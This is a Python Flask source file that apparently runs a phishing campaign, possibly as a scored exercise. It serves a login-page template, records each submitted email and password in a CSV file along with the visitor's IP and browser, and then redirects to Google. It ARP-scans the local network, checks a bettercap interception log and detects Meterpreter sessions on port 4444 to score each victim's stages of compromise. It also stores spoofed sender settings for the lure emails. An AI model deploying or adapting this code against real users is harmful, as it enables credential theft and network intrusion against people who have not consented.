import sys
import json
import csv
import psutil
from datetime import datetime
import ipaddress
from kamene.all import *
import netifaces
import re
from flask import Flask, request, render_template, redirect


app = Flask(__name__)
app.config['STATIC_FOLDER'] = 'static'

FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date', 'stage1','stage2', 'stage3', 'stage4']

EMAIL_REGEX = r'(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)'

CONFIG_FILE = 'config/config.json'

STAGES = {
    'stage1': 1,
    'stage2': 2,
    'stage3': 3,
    'stage4': 4,
}


def manage_json(data):
    try:
        with open(CONFIG_FILE, 'r') as json_data:
            file_json = json.load(json_data)
    except:
        file_json = {}

    with open(CONFIG_FILE, 'w+') as json_data:
        file_json.update(data)
        json.dump(file_json, json_data)


def gather_ip_address(iface):
    network = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['broadcast'].replace('255', '0')
    ans,unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=f'{network}/24'),timeout=2, verbose=0)
    list_ip_address = []
    for ip in ans.res:
        list_ip_address.append(ip[0]['ARP'].pdst)
    return list_ip_address


def check_stage(log_file, ip_addr):
    with open(log_file) as f:
        content = f.readlines()
        return ip_addr in content


def check_meterpreter_session(ip_addr):
    return len([x for x in psutil.net_connections() if x.laddr.port == 4444 and x.raddr.ip == ip_addr]) > 0


def calculate_points():
    input_file = csv.DictReader(open('log.csv', 'r'))
    out = [ row for row in input_file ]
    for line in out:
        points = 0
        for stage in STAGES:
            if line[stage] == 'True':
                points += STAGES[stage]
        line.update({'points': points})
    return out


def validate(local_ip, email_address):
    errors = [f'Invalid email: {email}' for email in email_address if re.match(EMAIL_REGEX, email) == None]
    try:
        ipaddress.ip_address(local_ip)
    except ValueError:
        errors.append('Local IP address is not a valid format')
    return errors
        

@app.route('/', methods=['GET', 'POST'])
def phishing_server():
    target = sys.argv[1]
    if request.method == 'POST':
        with open('log.csv', 'w+', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
            writer.writeheader()
            writer.writerow({
                'ip_addr': request.remote_addr,
                'email': request.form['email'],
                'password': request.form['password'],
                'user_agent': f'{request.user_agent.browser} - {request.user_agent.version}',
                'platform': request.user_agent.platform,
                'date': datetime.now().strftime('%H:%m %d-%m-%Y'),
                'stage1': check_stage('log_bettercap.txt', request.remote_addr) or request.remote_addr,
                'stage2': True,
                'stage3': check_meterpreter_session(request.remote_addr),
                'stage4': True if request.form['email'] and request.form['password'] else False,
            })        
            return redirect("https://www.google.com", code=302)
    return render_template(target, name='index')


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    return render_template(
        'dashboard.html', 
        response=calculate_points(), 
        name='dashboard'
    )


@app.route('/config', methods=['GET', 'POST'])
def config():
    errors = []
    if request.method == 'POST':
        local_ip = request.form.get('local-ip')
        iface = request.form.get('iface')
        target_domain = request.form.get('target-domain')
        email_address = request.form.get('email-address')
        email_address = email_address.replace(' ', '').split(',')

        errors = validate(local_ip, email_address)
        if not errors:
            data = {}
            data['config'] = {
                'local_ip': local_ip,
                'iface': iface,
                'target_domain': target_domain,
                'email_address': email_address,
                'list_ip_address': gather_ip_address(iface)
            }
            
            manage_json(data)

            return render_template(
            'email.html',
            response=errors,
            name='config'
        )
    return render_template(
        'config.html',
        response=errors,
        name='config'
    )


@app.route('/email', methods=['GET', 'POST'])
def email():
    errors = []
    if request.method == 'POST':
        from1 = request.form.get('from1', '')
        from1_verbose = request.form.get('from1-verbose', '')
        body1_email = request.form.get('body-email1', '')
        from2 = request.form.get('from2', '')
        from2_verbose = request.form.get('from2-verbose', '')
        body2_email = request.form.get('body-email2', '')

        
        data = {}
        data['email_config'] = {
            'email1':{
                'from': from1,
                'from_verbose': from1_verbose,
                'body_email': body1_email,
            },
            'email2':{
                'from': from2,
                'from_verbose': from2_verbose,
                'body_email': body2_email,
            }
        }

        manage_json(data)

        return render_template(
            'start.html',
            response=[],
            name='start'
        )
    
    return render_template(
        'email.html',
        response=[],
        name='email'
    )

@app.route('/start', methods=['GET', 'POST'])
def start():
    return render_template(
        'start.html',
        response=[],
        name='start'
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80', debug=True)
